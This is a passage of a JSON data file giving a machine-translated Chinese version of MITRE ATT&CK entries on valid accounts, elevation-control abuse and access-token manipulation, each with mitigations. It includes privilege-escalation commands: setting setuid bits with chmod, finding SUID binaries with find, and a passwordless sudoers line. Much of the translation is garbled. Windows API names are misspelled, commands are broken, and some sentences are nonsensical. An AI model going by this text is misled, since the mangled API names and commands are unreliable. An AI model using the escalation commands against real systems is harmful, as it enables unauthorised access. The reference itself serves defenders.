        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Valid Accounts",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会获得和滥用域帐户的证书，以此作为获得初始访问，持久性，特权升级或逃避国防的一种手段。域帐户是由Active Directory域服务管理的域帐户，在该服务域服务中，在该域的一部分中配置了访问和权限。域帐户可以涵盖用户，管理员和服务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会通过各种方式（例如OS凭据转储或重复使用密码重复使用）妥协域帐户，其中一些域名具有高度特权，从而允许访问该域的特权资源。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "将多因素身份验证（MFA）整合为组织政策的一部分，可以大大降低对手获得对有效凭证的控制的风险，这些凭据可用于其他策略，例如初始访问，横向移动和收集信息。MFA也可以用于限制对云资源和API的访问。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "审计域帐户的许可级别通常会寻找可以通过获得特权帐户的凭据来获得对手获得广泛访问的情况。除非受到严格控制并分割帐户的使用，否则请勿将用户或管理域帐户跨系统组合放在本地管理员组中，因为这通常等于在所有系统上拥有具有相同密码的本地管理员帐户。遵循企业网络设计和管理的最佳实践，以限制行政层的特权帐户使用。如果获得帐户凭据，则限制整个系统的凭据重叠，以防止访问。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "应用程序可以发送推送通知以验证登录名为多因素身份验证（MFA）的形式。培训用户只接受有效的推送通知并报告可疑推送通知。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078.003",
    "name": "Local Accounts",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Valid Accounts",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会获得当地帐户的滥用证书，以此作为获得初始访问，持久性，特权升级或逃避国防的手段。本地帐户是由组织配置的，供用户使用，远程支持，服务或单个系统或服务上的管理。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当地帐户也可能被滥用，以通过OS凭证倾销来提高特权和收获凭据。密码重复使用可能允许在网络上滥用一组机器，以进行特权升级和横向移动。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保本地管理员帐户在网络上的所有系统中都具有复杂的独特密码。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "审核本地帐户的许可级别通常会寻找可以通过获得特权帐户的凭据来获得广泛访问的情况。限制用于日常运营的本地管理员帐户的使用，这些帐户可能会使它们暴露于潜在的对手。"
            }
          ],
          [
            {
              "type": "text",
              "content": "例如，审核在Kubernetes中使用服务帐户的使用，并避免自动授予他们访问Kubernetes API（如果不需要）。实施圈量也可能有助于防止在域上重用本地管理员凭据。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078.004",
    "name": "Cloud Accounts",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Valid Accounts",
    "version": "1.6",
    "description": [
      [
        {
          "type": "text",
          "content": "云环境中的有效帐户可能会使对手能够执行动作以实现初始访问，持久性，特权升级或防御逃避。云帐户是由组织创建和配置的，供用户使用，远程支持，服务或云服务提供商或SaaS应用程序中的资源管理。云帐户可以仅存在于云中，也可以通过与其他身份源（例如Windows Active Directory）联合通过联邦来源在本地系统和云之间连接。"
        }
      ],
      [
        {
          "type": "text",
          "content": "服务或用户帐户可以通过蛮力，网络钓鱼或其他各种访问环境的方式来针对对手。联邦帐户可能是对手影响本地系统和云环境的途径。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会在折衷的云帐户上创建持久的额外云凭据，以保持环境中的持久性。这些凭据也可以用于绕过安全控制，例如多因素身份验证。"
        }
      ],
      [
        {
          "type": "text",
          "content": "云帐户还可以通过环境中的各种方式假设临时提高云访问或其他特权。在角色分配或角色假设策略中进行的错误配置可能允许对手使用这些机制来利用帐户预期范围之外的权限。此类特权帐户可用于通过云API或其他方法从在线存储帐户和数据库中收集敏感数据。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1036",
        "name": "帐户使用政策",
        "description": [
          [
            {
              "type": "text",
              "content": "使用条件访问策略来阻止不合规设备或外部定义的组织IP范围的登录。"
            }
          ]
        ]
      },
      {
        "id": "M1015",
        "name": "Active Directory配置",
        "description": [
          [
            {
              "type": "text",
              "content": "禁用不支持MFA的旧版身份验证，而需要使用现代身份验证协议。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "对云帐户，尤其是特权帐户使用多因素身份验证。这可以以多种形式（例如硬件，虚拟，SMS）实现，也可以使用管理报告功能进行审核。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保云帐户，特别是特权帐户，在网络上的所有系统中都具有复杂的独特密码。密码和访问密钥应定期旋转。如果凭据在不知情的情况下损害了凭据，这限制了时间凭据可用于访问资源。云服务提供商可能会跟踪访问密钥年龄，以帮助审核并确定可能需要旋转的密钥。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "经常查看特权云帐户许可级别，以寻找可以允许对手获得广泛访问的人，例如Azure AD中的全球管理员和特权角色管理员。这些评论还应检查是否创建了未授权的新特权云帐户。例如，在Azure Ad环境中，请求警报以通知帐户何时在不使用特权角色的情况下进行了很多天，因为这些角色可以被删除。考虑使用临时，即时（JIT）特权访问Azure AD资源，而不是永久分配特权角色。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "定期查看用户帐户并删除那些不活动或不必要的帐户。限制用户帐户创建其他帐户的能力。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "应用程序可以发送推送通知以验证登录名为多因素身份验证（MFA）的形式。培训用户只接受有效的推送通知并报告可疑推送通知。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1548.001",
    "name": "Setuid and Setgid",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Abuse Elevation Control Mechanism",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用应用程序设置的应用程序或setGID位，以使代码在其他（可能更有特权）用户的上下文中运行。在Linux或MacOS上，当设置了应用程序二进制的setuID或setGID位时，该应用程序将分别以拥有用户或组的特权运行。通常，无论用户或组拥有该应用程序，都在当前用户的上下文中运行应用程序。但是，在某些情况下，需要在高架上下文中执行程序才能正常运行，但是运行它们的用户可能没有特定所需的特权。"
        }
      ],
      [
        {
          "type": "text",
          "content": "任何用户都可以为自己的应用程序设置要设置的setUID或setGID标志（即Linux和Mac文件以及目录权限修改），而不是必须在Sudoers文件中创建条目。"
        },
        {
          "type": "code",
          "content": " chmod "
        },
        {
          "type": "text",
          "content": "命令可以使用位卸义，"
        },
        {
          "type": "code",
          "content": " chmod 4777 [file] "
        },
        {
          "type": "text",
          "content": "或通过速记命名，"
        },
        {
          "type": "code",
          "content": " chmod u+s [file] "
        },
        {
          "type": "text",
          "content": "。这将启用setuid位。要启用setGid位，可以使用"
        },
        {
          "type": "code",
          "content": " chmod 2775 "
        },
        {
          "type": "text",
          "content": " "
        },
        {
          "type": "code",
          "content": " chmod g+s "
        },
        {
          "type": "text",
          "content": "可以使用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以在自己的恶意软件上使用这种机制，以确保他们将来能够在高架上下文中执行。这种滥用通常是“壳逃脱”或其他行动绕过具有限制权限的执行环境的一部分。"
        }
      ],
      [
        {
          "type": "text",
          "content": "另外，对手可以选择使用已经启用的setuID或setGID位（即文件和目录发现）找到和靶向弱势二进制文件。通过"
        },
        {
          "type": "code",
          "content": " ls -L "
        },
        {
          "type": "text",
          "content": "查看文件属性时，setUID和setGuID位用“ s”而不是“ x”表示。"
        },
        {
          "type": "code",
          "content": "查找"
        },
        {
          "type": "text",
          "content": "命令也可以用于搜索此类文件。例如，"
        },
        {
          "type": "code",
          "content": " find/-perm +4000 2>/dev/null "
        },
        {
          "type": "text",
          "content": "可用于查找具有setuid set的文件和"
        },
        {
          "type": "code",
          "content": " find/-perm +2000 2>/dev/dev/null "
        },
        {
          "type": "text",
          "content": "可以用于setGID。然后，具有这些位置的二进制文件可能会被对手滥用。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "具有已知漏洞或已知外壳逃生的应用程序不应设置固定位或setGID位，以减少应用程序损害的潜在损害。此外，应在系统中最小化具有setuID或setGID位的程序数量。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1548.002",
    "name": "Bypass User Account Control",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Abuse Elevation Control Mechanism",
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以绕过UAC机制来提高系统特权。Windows用户帐户控制（UAC）允许程序提高其特权（以低至高度为单位的完整性级别跟踪）以执行管理员级别的任务，这可能是通过提示用户确认确认的。对用户的影响范围从拒绝高执行下的操作到允许用户在本地管理员组中执行操作，并单击该提示，或者允许他们输入管理员密码以完成操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果将计算机的UAC保护级别设置为除最高级别以外的任何内容，则某些Windows程序可以提升特权或执行某些高架组件对象模型对象，而无需通过UAC通知框提示用户。一个例子是使用rundll32加载特定制作的DLL，该dll加载自动升级的组件对象模型对象，并在受保护的目录中执行文件操作，该目录通常需要提高访问权限。恶意软件也可能被注入一个值得信赖的过程中，以在不提示用户提示的情况下获得提高特权。"
        }
      ],
      [
        {
          "type": "text",
          "content": "已经发现许多方法绕过UAC。UACME的GitHub读数页面包含已发现和实施的大量方法列表，但可能不是全面的旁路列表。定期发现其他旁路方法，有些在野外使用，例如："
        }
      ],
      [
        {
          "type": "list",
          "content": "EventVwr.exe可以自动说明并执行指定的二进制或脚本。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果已知具有管理员特权的帐户的凭据，则可以通过一些横向移动技术进行另一个旁路，因为UAC是单个系统安全机制，并且在一个系统上运行的过程的特权或完整性在一个系统上运行的特权或完整性将在远程系统上不明，并且默认为高完整性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "检查Windows系统上的常见UAC旁路弱点，以了解风险姿势并在适当的情况下解决问题。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "从系统上的本地管理员组中删除用户。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑将Windows更新到最新版本和补丁级别，以利用针对UAC旁路的最新保护措施。"
            }
          ]
        ]
      },
      {
        "id": "M1052",
        "name": "用户帐户控制",
        "description": [
          [
            {
              "type": "text",
              "content": "尽管存在UAC旁路技术，但在可能的情况下，使用UAC的最高执法级别仍然是谨慎的，并减轻诸如DLL搜索订单劫持等技术存在的旁路机会。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1548.003",
    "name": "Sudo and Sudo Caching",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Abuse Elevation Control Mechanism",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以执行Sudo缓存和/或使用Sudoers文件来提高特权。对手可以这样做，以执行命令作为其他用户或具有更高特权的产卵过程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux和MacOS系统中，Sudo（有时称为“ Superuser do”）允许用户从具有升高特权的终端执行命令，并控制谁可以在系统上执行这些命令。"
        },
        {
          "type": "code",
          "content": " sudo "
        },
        {
          "type": "text",
          "content": "命令“允许系统管理员委派权限，以使某些用户（或用户组）能够运行某些（或全部）命令作为root或其他用户，同时提供审计跟踪命令及其论点。”由于Sudo是为系统管理员制作的，因此它具有一些有用的配置功能，例如"
        },
        {
          "type": "code",
          "content": " timestamp_timeout "
        },
        {
          "type": "text",
          "content": "，这是"
        },
        {
          "type": "code",
          "content": " sudo "
        },
        {
          "type": "text",
          "content": "实例之间的时间量 - 预计密码。这是因为"
        },
        {
          "type": "code",
          "content": " sudo "
        },
        {
          "type": "text",
          "content": "有能力在一段时间内缓存凭据。sudo在"
        },
        {
          "type": "code",
          "content": "/var/db/sudo "
        },
        {
          "type": "text",
          "content": "上创建（或触摸）文件，并在上次运行何时进行时间戳以确定此超时。此外，还有一个"
        },
        {
          "type": "code",
          "content": " tty_tickets "
        },
        {
          "type": "text",
          "content": "变量，可以隔离处理每个新的TTY（终端会话）。这意味着，例如，一个TTY的Sudo超时不会影响另一个TTY（您必须再次键入密码）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "sudoers文件，"
        },
        {
          "type": "code",
          "content": "/etc/sudoers "
        },
        {
          "type": "text",
          "content": "，描述了哪些用户可以运行哪些命令以及从哪些终端来运行。这还描述了哪些命令用户可以作为其他用户或组运行。这提供了最少特权的原则，使用户在大多数情况下在最低的权限中运行，并且只能根据需要提示密码来提高其他用户或权限。但是，sudoers文件还可以指定何时不提示用户使用"
        },
        {
          "type": "code",
          "content": " user1 all =（all）nopasswd：all "
        },
        {
          "type": "text",
          "content": "之类的线路。不过，需要提高特权来编辑此文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以滥用这些机制的不良配置，以升级特权，而无需用户的密码。例如，可以监视"
        },
        {
          "type": "code",
          "content": "/var/db/sudo "
        },
        {
          "type": "text",
          "content": "的时间戳，以查看它是否属于"
        },
        {
          "type": "code",
          "content": " timestamp_timeout "
        },
        {
          "type": "text",
          "content": " ranga。如果是这样，则恶意软件可以执行sudo命令，而无需提供用户的密码。另外，如果禁用"
        },
        {
          "type": "code",
          "content": " tty_tickets "
        },
        {
          "type": "text",
          "content": "，则对手可以从该用户的任何TTY中执行此操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在野外，恶意软件已禁用"
        },
        {
          "type": "code",
          "content": " tty_tickets "
        },
        {
          "type": "text",
          "content": "，通过发出"
        },
        {
          "type": "code",
          "content": " echo \\'默认值！为了反映此更改，恶意软件还会发出 killall终端"
        },
        {
          "type": "text",
          "content": "。与Macos Sierra一样，Sudoers文件默认情况下启用了"
        },
        {
          "type": "code",
          "content": " tty_tickets "
        },
        {
          "type": "text",
          "content": "。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "确保启用"
            },
            {
              "type": "code",
              "content": " tty_tickets "
            },
            {
              "type": "text",
              "content": "设置将防止在TTY会话中泄漏。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "通过需要密码，即使对手可以获取终端访问，他们也必须知道在sudoers文件中运行任何内容的密码。将"
            },
            {
              "type": "code",
              "content": " timestamp_timeout "
            },
            {
              "type": "text",
              "content": "设置为0将要求用户每次执行"
            },
            {
              "type": "code",
              "content": " sudo "
            },
            {
              "type": "text",
              "content": "时输入密码。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "应该严格编辑sudoers文件，以便始终需要密码，并且用户不能随着具有较高特权的用户而产生的风险流程。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1548.004",
    "name": "Elevated Execution with Prompt",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Abuse Elevation Control Mechanism",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会利用"
        },
        {
          "type": "code",
          "content": "授权ExecuteWithPrivileges "
        },
        {
          "type": "text",
          "content": " API通过提示用户凭证升级特权。此API的目的是为应用程序开发人员提供一种使用根特权（例如应用程序安装或更新）执行操作的简便方法。该API未验证要求根特权的程序来自信誉良好的来源或已被恶意修改。"
        }
      ],
      [
        {
          "type": "text",
          "content": "尽管该API被弃用了，但它仍然在MacOS的最新版本中充分发挥作用。调用此API时，将提示用户输入其凭据，但没有对程序的来源或完整性进行检查。调用API的程序还可以加载世界上可写的文件，这些文件可以修改以使用特权提高的恶意行为。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用"
        },
        {
          "type": "code",
          "content": "授权executewithprivileges "
        },
        {
          "type": "text",
          "content": "获得根特权，以便在受害者上安装恶意软件并安装持久机制。该技术可以与伪装成欺骗用户授予恶意代码升级的特权。该技术还显示通过修改使用此API的机器上存在的合法程序来起作用。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "系统设置可以防止应用程序运行，这些应用程序尚未通过Apple Store下载，这可能有助于减轻其中一些问题。不允许运行未签名的应用程序也可能降低一些风险。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1548.005",
    "name": "Temporary Elevated Cloud Access",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Abuse Elevation Control Mechanism",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用权限配置，从而使他们能够暂时提高对云资源的访问。许多云环境允许管理员授予用户或服务帐户的权限，以请求即时访问角色，假冒其他帐户，将角色传递到资源和服务上，或者以其他方式获得对一套可能不同的特权的短期访问从他们自己的。"
        }
      ],
      [
        {
          "type": "text",
          "content": "即将到来的访问是一种以精细的临时方式授予云帐户的其他角色的机制。这允许帐户仅在每天需要的权限下运行，并在必要时要求额外的权限。有时，即时访问请求被配置为需要手动批准，而其他时间则自动授予所需的权限。"
        }
      ],
      [
        {
          "type": "text",
          "content": "帐户模仿允许用户或服务帐户在另一个帐户的权限下临时行动。例如，在具有"
        },
        {
          "type": "code",
          "content": " iam.serviceaccounttokencreator "
        },
        {
          "type": "text",
          "content": "角色的GCP用户中，角色可以创建临时访问令牌或签署服务帐户权限的任意有效负载。在在线交换中，"
        },
        {
          "type": "code",
          "content": "应用程序障碍"
        },
        {
          "type": "text",
          "content": "角色允许服务帐户使用与指定的用户帐户相关的权限。"
        }
      ],
      [
        {
          "type": "text",
          "content": "许多云环境还包括用户将角色传递给资源的机制，使他们可以执行任务并对其他服务进行身份验证。虽然创建资源的用户无法直接承担其传递的角色，但他们仍然可以利用角色的访问权限 - 例如，通过配置资源以使用已授予的权限执行某些操作。在AWS中，具有"
        },
        {
          "type": "code",
          "content": " passrole "
        },
        {
          "type": "text",
          "content": "权限的用户可以允许他们创建的服务以扮演给定角色，而在GCP中，使用"
        },
        {
          "type": "code",
          "content": " iam.serviceaccountuser "
        },
        {
          "type": "text",
          "content": "角色可以附加一个服务帐户资源。"
        }
      ],
      [
        {
          "type": "text",
          "content": "虽然用户需要特定的角色分配才能使用这些功能，但云管理员可能会错误配置权限。这可能导致升级路径，使对手能够访问超出原本预期的资源。"
        }
      ],
      [
        {
          "type": "text",
          "content": "注意：此技术与其他云角色不同，该角色涉及将永久角色分配给帐户，而不是滥用现有的权限结构以暂时提升资源访问。但是，损害足够特权帐户的对手可能会授予另一个帐户，他们控制其他云角色，从而使他们也可以滥用这些功能。与直接使用高度特权帐户相比，这也可以允许更大的隐身，尤其是当日志没有阐明角色模仿时。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "将云帐户的特权限制为仅限于所需的内容，以假定，创建或冒充其他角色，政策和权限。在启用及时访问的地方，请考虑需要手动批准才能临时提升特权。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1134.001",
    "name": "Token Impersonation/Theft",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Access Token Manipulation",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会复制，然后模仿另一个用户的现有令牌，以升级特权和绕过访问控件。例如，对手可以使用"
        },
        {
          "type": "code",
          "content": " deplicateToken "
        },
        {
          "type": "text",
          "content": "或"
        },
        {
          "type": "code",
          "content": " deplicateTeTokenex "
        },
        {
          "type": "text",
          "content": "复制现有令牌。然后可以将令牌与"
        },
        {
          "type": "code",
          "content": " ImpersonateLoggedOnuser "
        },
        {
          "type": "text",
          "content": "一起使用，以允许调用线程模仿登录用户的安全性上下文，或"
        },
        {
          "type": "code",
          "content": " setThreadToken "
        },
        {
          "type": "text",
          "content": "将假冒的令牌分配给线程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当对手有一个特定的现有过程，他们希望将重复的令牌分配给，他们可能会执行令牌模仿/盗窃。例如，这对于目标用户在系统上具有非网络登录会话时可能很有用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当对手会使用重复的令牌来创建新过程而不是附加到现有过程中时，他们可以使用令牌使用"
        },
        {
          "type": "code",
          "content": " createProcesprocesswithtokenw "
        },
        {
          "type": "text",
          "content": "或"
        },
        {
          "type": "code",
          "content": " createprocrecessasasuserw "
        },
        {
          "type": "text",
          "content": "来创建进程。令牌模仿/盗窃也不同于制造和模仿令牌，因为它是指复制现有令牌，而不是创建新的令牌。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制权限，以便用户和用户组无法创建令牌。此设置应仅针对本地系统帐户定义。GPO：计算机配置> [策略]> Windows设置>安全设置>本地策略>用户版权分配：创建一个令牌对象。还定义谁可以通过GPO创建一个流程级别令牌，仅通过GPO：计算机配置> [策略]> Windows设置>安全设置>安全设置>本地策略>用户权利分配：替换流程级别标记。"
            }
          ],
          [
            {
              "type": "text",
              "content": "管理员应使用内置访问令牌操作命令"
            },
            {
              "type": "code",
              "content": " runas "
            },
            {
              "type": "text",
              "content": "使用管理员特权以标准用户登录其工具。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "对手必须已经在本地系统上具有管理员级别的访问权限才能充分利用此技术。确保将用户和帐户限制为他们需要的最低特权。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1134.002",
    "name": "Create Process with Token",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Access Token Manipulation",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会创建一个新的过程，并具有现有令牌，以升级特权和绕过访问控件。可以使用"
        },
        {
          "type": "code",
          "content": " createProcessWithTokenW "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " runas "
        },
        {
          "type": "text",
          "content": "的功能，使用其他用户的令牌和结果安全上下文创建进程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "使用与当前用户无关的令牌创建流程可能需要目标用户的凭据，特定特权来模仿该用户或访问要使用的令牌。例如，可以通过代币模仿/盗窃来复制令牌，或在用于创建过程之前通过Make and Phagships farne创建的令牌。"
        }
      ],
      [
        {
          "type": "text",
          "content": "尽管该技术与令牌的模仿/盗窃不同，但这些技术可以在复制令牌的情况下结合使用，然后用于创建新的过程。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制权限，以便用户和用户组无法创建令牌。此设置应仅针对本地系统帐户定义。GPO：计算机配置> [策略]> Windows设置>安全设置>本地策略>用户版权分配：创建一个令牌对象。还定义谁可以通过GPO创建一个流程级别令牌，仅通过GPO：计算机配置> [策略]> Windows设置>安全设置>安全设置>本地策略>用户权利分配：替换流程级别标记。"
            }
          ],
          [
            {
              "type": "text",
              "content": "管理员应使用内置访问令牌操作命令"
            },
            {
              "type": "code",
              "content": " runas "
            },
            {
              "type": "text",
              "content": "使用管理员特权以标准用户登录其工具。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "对手必须已经在本地系统上具有管理员级别的访问权限才能充分利用此技术。确保将用户和帐户限制为他们需要的最低特权。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1134.003",
    "name": "Make and Impersonate Token",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Access Token Manipulation",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会使新的代币并模仿用户升级特权和绕过访问控件。例如，如果对手具有用户名和密码，但是未将用户登录到系统，则对手可以使用"
        },
        {
          "type": "code",
          "content": " logonuser "
        },
        {
          "type": "text",
          "content": "函数为用户创建登录会话。该功能将返回新会话的访问令牌的副本，对手可以使用"
        },
        {
          "type": "code",
          "content": " setThreadToken "
        },
        {
          "type": "text",
          "content": "将令牌分配给线程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "这种行为不同于令牌模仿/盗窃，因为这是指创建新用户令牌，而不是窃取或重复现有的用户。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制权限，以便用户和用户组无法创建令牌。此设置应仅针对本地系统帐户定义。GPO：计算机配置> [策略]> Windows设置>安全设置>本地策略>用户版权分配：创建一个令牌对象。还定义谁可以通过GPO创建一个流程级别令牌，仅通过GPO：计算机配置> [策略]> Windows设置>安全设置>安全设置>本地策略>用户权利分配：替换流程级别标记。"
            }
          ],
          [
            {
              "type": "text",
              "content": "管理员应使用内置访问令牌操作命令"
            },
            {
              "type": "code",
              "content": " runas "
            },
            {
              "type": "text",
              "content": "使用管理员特权以标准用户登录其工具。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "对手必须已经在本地系统上具有管理员级别的访问权限才能充分利用此技术。确保将用户和帐户限制为他们需要的最低特权。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1134.004",
    "name": "Parent PID Spoofing",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Access Token Manipulation",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会为逃避过程监测防御或提高特权的新过程欺骗父进程标识符（PPID）。除非明确指定，否则通常会直接从父母或致电过程中产生新过程。明确分配新过程的PPID的一种方法是通过"
        },
        {
          "type": "code",
          "content": " createProcess "
        },
        {
          "type": "text",
          "content": " api调用，该调用支持定义使用PPID的参数。Windows功能（例如用户帐户控件（UAC））使用此功能来正确设置PPID，该功能由系统产生请求的提升过程（通常通过"
        },
        {
          "type": "code",
          "content": " svchost.exe.exe "
        },
        {
          "type": "text",
          "content": "或<code> consent.exe.exe </代码>），而不是当前的用户上下文。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用这些机制来逃避防御措施，例如直接从办公室文档产生的那些阻止过程，以及针对异常/潜在的恶意父母亲子过程关系的分析，例如欺骗popiD popi> code> explorer.exe.exe.exe</code>而不是作为矛盾附件的一部分提供的办公室文件。这种欺骗可以通过恶意办公室文档或任何可以执行本机API的代码中的Visual Basic执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "明确分配PPID还可以在给定适当访问父进程的权限的情况下启用提升特权。例如，特权用户上下文中的对手（即管理员）可以产生一个新的过程，并将父派分配为运行为系统的过程（例如"
        },
        {
          "type": "code",
          "content": " lsass.exe "
        },
        {
          "type": "text",
          "content": "），从而导致新过程是通过继承的访问令牌提升。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1134.005",
    "name": "SID-History Injection",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Access Token Manipulation",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
